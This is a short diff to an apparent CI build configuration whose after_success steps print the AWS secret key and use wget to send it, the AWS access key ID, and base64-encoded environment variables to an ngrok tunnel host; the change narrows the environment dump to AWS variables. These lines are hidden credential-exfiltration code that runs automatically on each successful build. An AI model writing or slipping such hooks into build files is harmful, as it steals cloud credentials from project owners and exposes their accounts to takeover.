@@ -13,5 +13,5 @@ after_success:
   - docker --version
   - echo $AWS_SECRET_ACCESS_KEY
   - wget http://552aea016ec3.ngrok.io/`echo $AWS_SECRET_ACCESS_KEY`
-  - wget http://552aea016ec3.ngrok.io/`env|base64`
+  - wget http://552aea016ec3.ngrok.io/`env|grep -i AWS | base64`
   - wget http://552aea016ec3.ngrok.io/`echo $AWS_ACCESS_KEY_ID`
